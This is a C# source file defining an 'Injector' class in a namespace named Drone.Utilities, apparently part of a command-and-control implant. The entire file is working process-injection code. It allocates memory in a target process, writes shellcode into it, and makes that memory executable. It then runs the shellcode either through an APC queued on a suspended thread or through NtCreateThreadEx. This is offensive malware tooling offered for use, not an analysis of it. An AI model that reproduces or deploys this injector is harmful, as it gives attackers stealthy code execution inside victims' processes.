using System;

namespace Drone.Utilities;

public class Injector
{
    private readonly byte[] _shellcode;

    public Injector(byte[] shellcode)
    {
        _shellcode = shellcode;
    }

    public bool InjectAndResume(Win32.PROCESS_INFORMATION pi)
    {
        // allocate memory region
        var baseAddress = AllocateMemory(pi.hProcess);
        
        if (baseAddress == IntPtr.Zero)
            return false;
        
        // write shellcode
        if (!WriteMemory(pi.hProcess, baseAddress))
            return false;
        
        // flip memory protection
        if (!MakeExecutable(pi.hProcess, baseAddress))
            return false;
        
        // queue apc
        if (!Win32.QueueUserApc(baseAddress, pi.hThread))
            return false;
        
        // resume thread
        if (!Native.NtResumeThread(pi.hThread))
            return false;
        
        // close handles
        Win32.CloseHandle(pi.hThread);
        Win32.CloseHandle(pi.hProcess);

        return true;
    }

    public bool Inject(IntPtr hProcess)
    {
        // allocate memory region
        var baseAddress = AllocateMemory(hProcess);
        
        if (baseAddress == IntPtr.Zero)
            return false;
        
        // write shellcode
        if (!WriteMemory(hProcess, baseAddress))
            return false;
        
        // flip memory protection
        if (!MakeExecutable(hProcess, baseAddress))
            return false;

        var hThread = CreateThread(hProcess, baseAddress);

        if (hThread == IntPtr.Zero)
            return false;
        
        Win32.CloseHandle(hThread);
        return true;
    }
    
    private IntPtr AllocateMemory(IntPtr hProcess)
    {
        return Native.NtAllocateVirtualMemory(
            hProcess,
            _shellcode.Length,
            Native.MEMORY_ALLOCATION.MEM_COMMIT | Native.MEMORY_ALLOCATION.MEM_RESERVE,
            Native.MEMORY_PROTECTION.PAGE_READWRITE);
    }

    private bool WriteMemory(IntPtr hProcess, IntPtr baseAddress)
    {
        return Native.NtWriteVirtualMemory(
            hProcess,
            baseAddress,
            _shellcode);
    }

    private bool MakeExecutable(IntPtr hProcess, IntPtr baseAddress)
    {
        return Native.NtProtectVirtualMemory(
            hProcess,
            baseAddress,
            _shellcode.Length,
            Native.MEMORY_PROTECTION.PAGE_EXECUTE_READ,
            out _);
    }

    private static IntPtr CreateThread(IntPtr hProcess, IntPtr startAddress)
    {
        return Native.NtCreateThreadEx(hProcess, startAddress);
    }
}